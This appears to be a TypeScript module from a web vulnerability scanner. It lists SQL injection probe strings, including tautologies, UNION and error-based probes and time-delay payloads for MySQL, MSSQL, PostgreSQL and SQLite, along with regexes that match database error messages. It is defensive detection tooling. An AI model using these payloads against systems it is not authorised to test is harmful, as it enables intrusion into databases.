/** SQL injection test payloads — error-based, non-destructive detection only */
export const SQLI_PAYLOADS = [
  // Classic string-based
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  '" OR "1"="1',

  // Numeric-based
  '1 OR 1=1',
  '1 OR 1=1--',
  '1; SELECT 1--',

  // Error-based
  "' AND 1=CONVERT(int, @@version)--",
  "' UNION SELECT NULL--",
];

/** Time-based blind SQLi payloads — separated so we can measure response timing */
export const SQLI_TIME_PAYLOADS = [
  // MySQL
  "' OR SLEEP(2)--",
  "1 OR SLEEP(2)--",
  // MSSQL
  "1; WAITFOR DELAY '0:0:2'--",
  // PostgreSQL
  "'; SELECT pg_sleep(2)--",
  // SQLite (no sleep, but heavy computation)
  "1 OR 1=1 AND RANDOMBLOB(500000000)--",
];

/** SQL error signatures indicating injection vulnerability */
export const SQL_ERROR_PATTERNS = [
  // MySQL / MariaDB
  /you have an error in your sql syntax/i,
  /SQL syntax.*?MySQL/i,
  /Warning.*?\Wmysqli?_/i,
  /mysql_fetch/i,
  /mysql_num_rows/i,
  /MariaDB server version/i,

  // PostgreSQL
  /PostgreSQL.*?ERROR/i,
  /pg_query/i,
  /pg_exec/i,
  /psycopg2\./i,
  /PG::SyntaxError/i,
  /unterminated string literal/i,

  // Microsoft SQL Server
  /unclosed quotation mark/i,
  /microsoft ole db provider/i,
  /Microsoft SQL Native Client/i,
  /\bODBC SQL Server Driver\b/i,
  /SQL Server.*?\d{4,}/i,

  // Oracle
  /ORA-\d{5}/,
  /quoted string not properly terminated/i,
  /oracle\.jdbc/i,
  /XMLDOM/i,

  // SQLite
  /sqlite3?\.OperationalError/i,
  /SQLite\/JDBCDriver/i,
  /unrecognized token/i,

  // Generic
  /SQLSTATE\[\w+\]/,
  /SQL command not properly ended/i,
  /invalid input syntax for/i,
  /Dynamic SQL Error/i,
  /unexpected end of SQL command/i,
];
